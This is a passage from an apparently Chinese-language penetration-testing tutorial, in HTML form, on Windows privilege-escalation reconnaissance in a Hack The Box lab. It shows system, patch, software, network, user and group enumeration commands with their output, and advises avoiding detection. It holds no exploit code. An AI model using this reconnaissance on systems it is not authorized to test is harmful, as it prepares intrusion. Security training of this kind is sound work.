 3/25/2021, 9:24:36 <span class="title">AM</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Manufacturer</span>:       <span class="title">VMware</span>, <span class="title">Inc</span>.</span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Model</span>:              <span class="title">VMware7</span>,1</span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Type</span>:               <span class="title">x64</span>-<span class="title">based</span> <span class="title">PC</span></span></span><br><span class="line"><span class="function"><span class="title">Processor</span>(<span class="title">s</span>):              3 <span class="title">Processor</span>(<span class="title">s</span>) <span class="title">Installed</span>.</span></span><br><span class="line"><span class="function">                           [01]: <span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0 <span class="title">AuthenticAMD</span> ~2994 <span class="title">Mhz</span></span></span><br><span class="line"><span class="function">                           [02]: <span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0 <span class="title">AuthenticAMD</span> ~2994 <span class="title">Mhz</span></span></span><br><span class="line"><span class="function">                           [03]: <span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0 <span class="title">AuthenticAMD</span> ~2994 <span class="title">Mhz</span></span></span><br><span class="line"><span class="function"><span class="title">BIOS</span> <span class="title">Version</span>:              <span class="title">VMware</span>, <span class="title">Inc</span>. <span class="title">VMW71</span>.00<span class="title">V</span>.16707776.<span class="title">B64</span>.2008070230, 8/7/2020</span></span><br><span class="line"><span class="function"><span class="title">Windows</span> <span class="title">Directory</span>:         <span class="title">C</span>:\<span class="title">Windows</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Directory</span>:          <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span></span></span><br><span class="line"><span class="function"><span class="title">Boot</span> <span class="title">Device</span>:               \<span class="title">Device</span>\<span class="title">HarddiskVolume2</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Locale</span>:             <span class="title">en</span>-<span class="title">us</span>;<span class="title">English</span> (<span class="title">United</span> <span class="title">States</span>)</span></span><br><span class="line"><span class="function"><span class="title">Input</span> <span class="title">Locale</span>:              <span class="title">en</span>-<span class="title">us</span>;<span class="title">English</span> (<span class="title">United</span> <span class="title">States</span>)</span></span><br><span class="line"><span class="function"><span class="title">Time</span> <span class="title">Zone</span>:                 (<span class="title">UTC</span>-08:00) <span class="title">Pacific</span> <span class="title">Time</span> (<span class="title">US</span> &amp; <span class="title">Canada</span>)</span></span><br><span class="line"><span class="function"><span class="title">Total</span> <span class="title">Physical</span> <span class="title">Memory</span>:     6,143 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Available</span> <span class="title">Physical</span> <span class="title">Memory</span>: 3,474 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Virtual</span> <span class="title">Memory</span>: <span class="title">Max</span> <span class="title">Size</span>:  10,371 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Virtual</span> <span class="title">Memory</span>: <span class="title">Available</span>: 7,544 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Virtual</span> <span class="title">Memory</span>: <span class="title">In</span> <span class="title">Use</span>:    2,827 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Page</span> <span class="title">File</span> <span class="title">Location</span>(<span class="title">s</span>):     <span class="title">C</span>:\<span class="title">pagefile.sys</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>:                    <span class="title">WORKGROUP</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Server</span>:              \\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">Hotfix</span>(<span class="title">s</span>):                 3 <span class="title">Hotfix</span>(<span class="title">s</span>) <span class="title">Installed</span>.</span></span><br><span class="line"><span class="function">                           [01]: <span class="title">KB3199986</span></span></span><br><span class="line"><span class="function">                           [02]: <span class="title">KB5001078</span></span></span><br><span class="line"><span class="function">                           [03]: <span class="title">KB4103723</span></span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Card</span>(<span class="title">s</span>):           2 <span class="title">NIC</span>(<span class="title">s</span>) <span class="title">Installed</span>.</span></span><br><span class="line"><span class="function">                           [01]: <span class="title">Intel</span>(<span class="title">R</span>) 82574<span class="title">L</span> <span class="title">Gigabit</span> <span class="title">Network</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="function">                                 <span class="title">Connection</span> <span class="title">Name</span>: <span class="title">Ethernet0</span></span></span><br><span class="line"><span class="function">                                 <span class="title">DHCP</span> <span class="title">Enabled</span>:    <span class="title">Yes</span></span></span><br><span class="line"><span class="function">                                 <span class="title">DHCP</span> <span class="title">Server</span>:     10.129.0.1</span></span><br><span class="line"><span class="function">                                 <span class="title">IP</span> <span class="title">address</span>(<span class="title">es</span>)</span></span><br><span class="line"><span class="function">                                 [01]: 10.129.43.8</span></span><br><span class="line"><span class="function">                                 [02]: <span class="title">fe80</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span></span></span><br><span class="line"><span class="function">                                 [03]: <span class="title">dead:beef</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span></span></span><br><span class="line"><span class="function">                           [02]: <span class="title">vmxnet3</span> <span class="title">Ethernet</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">                                 <span class="title">Connection</span> <span class="title">Name</span>: <span class="title">Ethernet1</span></span></span><br><span class="line"><span class="function">                                 <span class="title">DHCP</span> <span class="title">Enabled</span>:    <span class="title">No</span></span></span><br><span class="line"><span class="function">                                 <span class="title">IP</span> <span class="title">address</span>(<span class="title">es</span>)</span></span><br><span class="line"><span class="function">                                 [01]: 192.168.20.56</span></span><br><span class="line"><span class="function">                                 [02]: <span class="title">fe80</span>::<span class="title">f055:fefd</span>:<span class="title">b1b</span>:9919</span></span><br><span class="line"><span class="function"><span class="title">Hyper</span>-<span class="title">V</span> <span class="title">Requirements</span>:      <span class="title">A</span> <span class="title">hypervisor</span> <span class="title">has</span> <span class="title">been</span> <span class="title">detected</span>. <span class="title">Features</span> <span class="title">required</span> <span class="title">for</span> <span class="title">Hyper</span>-<span class="title">V</span> <span class="title">will</span> <span class="title">not</span> <span class="title">be</span> <span class="title">displayed</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="补丁和更新"><a href="#补丁和更新" class="headerlink" title="补丁和更新"></a>补丁和更新</h3><p>如果<code>systeminfo</code>没有显示修补程序，则可以使用带有<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering">QFE</a>的WMI 命令二进制文件通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">WMI</a>进行查询以显示补丁。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">qfe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Caption</span>                                     <span class="title">CSName</span>        <span class="title">Description</span>      <span class="title">FixComments</span>  <span class="title">HotFixID</span>   <span class="title">InstallDate</span>  <span class="title">InstalledBy</span>          <span class="title">InstalledOn</span>  <span class="title">Name</span>  <span class="title">ServicePackInEffect</span>  <span class="title">Status</span></span></span><br><span class="line"><span class="function"><span class="title">http</span>://<span class="title">support.microsoft.com</span>/?<span class="title">kbid</span>=3199986  <span class="title">WINLPE</span>-<span class="title">SRV01</span>  <span class="title">Update</span>                        <span class="title">KB3199986</span>               <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span>  11/21/2016</span></span><br><span class="line"><span class="function"><span class="title">https</span>://<span class="title">support.microsoft.com</span>/<span class="title">help</span>/5001078  <span class="title">WINLPE</span>-<span class="title">SRV01</span>  <span class="title">Security</span> <span class="title">Update</span>               <span class="title">KB5001078</span>               <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span>  3/25/2021</span></span><br><span class="line"><span class="function"><span class="title">http</span>://<span class="title">support.microsoft.com</span>/?<span class="title">kbid</span>=4103723  <span class="title">WINLPE</span>-<span class="title">SRV01</span>  <span class="title">Security</span> <span class="title">Update</span>               <span class="title">KB4103723</span>               <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span>  3/25/2021</span></span><br></pre></td></tr></table></figure>

<p>或者使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1">Get-Hotfix</a> 通过 powershell 查询</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-HotFix</span> | <span class="built_in">ft</span> <span class="literal">-AutoSize</span></span><br><span class="line"></span><br><span class="line">Source       Description     HotFixID  InstalledBy                InstalledOn</span><br><span class="line"><span class="literal">------</span>       <span class="literal">-----------</span>     <span class="literal">--------</span>  <span class="literal">-----------</span>                <span class="literal">-----------</span></span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Update          KB3199986 NT AUTHORITY\SYSTEM        <span class="number">11</span>/<span class="number">21</span>/<span class="number">2016</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Update          KB4054590 WINLPE<span class="literal">-SRV01</span>\Administrator <span class="number">3</span>/<span class="number">30</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Security Update KB5001078 NT AUTHORITY\SYSTEM        <span class="number">3</span>/<span class="number">25</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Security Update KB3200970 WINLPE<span class="literal">-SRV01</span>\Administrator <span class="number">4</span>/<span class="number">13</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br></pre></td></tr></table></figure>

<h3 id="安装的应用"><a href="#安装的应用" class="headerlink" title="安装的应用"></a>安装的应用</h3><p>WMI 还可用于显示已安装的软件。这些信息通常可以指导找到难以发现的漏洞。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">product</span> <span class="title">get</span> <span class="title">name</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Name</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">Java</span> 8 <span class="title">Update</span> 231 (64-<span class="title">bit</span>)</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">VMware</span> <span class="title">Tools</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">Java</span> <span class="title">Auto</span> <span class="title">Updater</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> cmdlet 通过 PowerShell 来执行此操作。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_Product |  <span class="built_in">select</span> Name, Version</span><br><span class="line"></span><br><span class="line">Name                                                                    Version</span><br><span class="line"><span class="literal">----</span>                                                                    <span class="literal">-------</span></span><br><span class="line">SQL Server <span class="number">2016</span> Database Engine Shared                                  <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">Microsoft OLE DB Driver <span class="keyword">for</span> SQL Server                                  <span class="number">18.3</span>.<span class="number">0.0</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2010</span>  x64 Redistributable - <span class="number">10.0</span>.<span class="number">40219</span>             <span class="number">10.0</span>.<span class="number">40219</span></span><br><span class="line">Microsoft Help Viewer <span class="number">2.3</span>                                               <span class="number">2.3</span>.<span class="number">28107</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2010</span>  x86 Redistributable - <span class="number">10.0</span>.<span class="number">40219</span>             <span class="number">10.0</span>.<span class="number">40219</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2013</span> x86 Minimum Runtime - <span class="number">12.0</span>.<span class="number">21005</span>              <span class="number">12.0</span>.<span class="number">21005</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2013</span> x86 Additional Runtime - <span class="number">12.0</span>.<span class="number">21005</span>           <span class="number">12.0</span>.<span class="number">21005</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2019</span> X64 Additional Runtime - <span class="number">14.28</span>.<span class="number">29914</span>          <span class="number">14.28</span>.<span class="number">29914</span></span><br><span class="line">Microsoft ODBC Driver <span class="number">13</span> <span class="keyword">for</span> SQL Server                                 <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">SQL Server <span class="number">2016</span> Database Engine Shared                                  <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">SQL Server <span class="number">2016</span> Database Engine Services                                <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">SQL Server Management Studio <span class="keyword">for</span> Reporting Services                     <span class="number">15.0</span>.<span class="number">18369.0</span></span><br><span class="line">Microsoft SQL Server <span class="number">2008</span> Setup Support Files                           <span class="number">10.3</span>.<span class="number">5500.0</span></span><br><span class="line">SSMS Post Install Tasks                                                 <span class="number">15.0</span>.<span class="number">18369.0</span></span><br><span class="line">Microsoft VSS Writer <span class="keyword">for</span> SQL Server <span class="number">2016</span>                                <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">Java <span class="number">8</span> Update <span class="number">231</span> (<span class="number">64</span><span class="literal">-bit</span>)                                              <span class="number">8.0</span>.<span class="number">2310.11</span></span><br><span class="line">Browser <span class="keyword">for</span> SQL Server <span class="number">2016</span>                                             <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">Integration Services                                                    <span class="number">15.0</span>.<span class="number">2000.130</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="正在运行的进程"><a href="#正在运行的进程" class="headerlink" title="正在运行的进程"></a>正在运行的进程</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat">netstat</a>命令将显示活动的 TCP 和 UDP 连接，这将使更好地了解哪些服务正在本地和外部可访问的端口上监听。可能会发现只有本地主机可访问的易受攻击的服务（登录到主机时），可以利用它来提升权限。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">21</span>             <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">1096</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>             <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">135</span>            <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">840</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">445</span>            <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">1433</span>           <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">3520</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">3389</span>           <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">968</span></span><br><span class="line">&lt;...SNIP...&gt;</span><br></pre></td></tr></table></figure>

<h2 id="User-Group-Information"><a href="#User-Group-Information" class="headerlink" title="User &amp; Group Information"></a>User &amp; Group Information</h2><p>确定哪些用户登录了系统始终很重要。在规避攻击期间，需要小心谨慎地处理其他用户正在积极工作的主机，以避免被发现。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">query</span> <span class="title">user</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">USERNAME</span>              <span class="title">SESSIONNAME</span>        <span class="title">ID</span>  <span class="title">STATE</span>   <span class="title">IDLE</span> <span class="title">TIME</span>  <span class="title">LOGON</span> <span class="title">TIME</span></span></span><br><span class="line"><span class="function">&gt;<span class="title">administrator</span>         <span class="title">rdp</span>-<span class="title">tcp</span>#2           1  <span class="title">Active</span>          .  3/25/2021 9:27 <span class="title">AM</span></span></span><br></pre></td></tr></table></figure>

<h3 id="当前用户"><a href="#当前用户" class="headerlink" title="当前用户"></a>当前用户</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">echo</span> %<span class="title">USERNAME</span>%</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">htb</span>-<span class="title">student</span> </span></span><br></pre></td></tr></table></figure>

<h3 id="当前用户权限"><a href="#当前用户权限" class="headerlink" title="当前用户权限"></a>当前用户权限</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                <span class="title">Description</span>                    <span class="title">State</span></span></span><br><span class="line"><span class="function">============================= ============================== ========</span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>       <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>       <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span> <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span> <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure>

<h3 id="当前用户组信息"><a href="#当前用户组信息" class="headerlink" title="当前用户组信息"></a>当前用户组信息</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">groups</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">GROUP</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">-----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">Name</span>                             <span class="title">Type</span>             <span class="title">SID</span>          <span class="title">Attributes</span></span></span><br><span class="line"><span class="function">====================================== ================ ============ ==================================================</span></span><br><span class="line"><span class="function"><span class="title">Everyone</span>                               <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-1-0      <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">BUILTIN</span>\<span class="title">Remote</span> <span class="title">Desktop</span> <span class="title">Users</span>           <span class="title">Alias</span>            <span class="title">S</span>-1-5-32-555 <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">BUILTIN</span>\<span class="title">Users</span>                          <span class="title">Alias</span>            <span class="title">S</span>-1-5-32-545 <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">REMOTE</span> <span class="title">INTERACTIVE</span> <span class="title">LOGON</span>  <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-14     <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>               <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-4      <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span>       <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-11     <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">This</span> <span class="title">Organization</span>         <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-15     <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Local</span> <span class="title">account</span>             <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-113    <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">LOCAL</span>                                  <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-2-0      <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">NTLM</span> <span class="title">Authentication</span>       <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-64-10  <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">Mandatory</span> <span class="title">Label</span>\<span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> <span class="title">Label</span>            <span class="title">S</span>-1-16-8192</span></span><br></pre></td></tr></table></figure>

<h3 id="所有用户"><a href="#所有用户" class="headerlink" title="所有用户"></a>所有用户</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">user</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">accounts</span> <span class="title">for</span> \\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>            <span class="title">DefaultAccount</span>           <span class="title">Guest</span></span></span><br><span class="line"><span class="function"><span class="title">helpdesk</span>                 <span class="title">htb</span>-<span class="title">student</span>              <span class="title">jordan</span></span></span><br><span class="line"><span class="function"><span class="title">sarah</span>                    <span class="title">secsvc</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="所有组"><a href="#所有组" class="headerlink" title="所有组"></a>所有组</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Aliases</span> <span class="title">for</span> \\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function">*<span class="title">Access</span> <span class="title">Control</span> <span class="title">Assistance</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">*<span class="title">Backup</span> <span 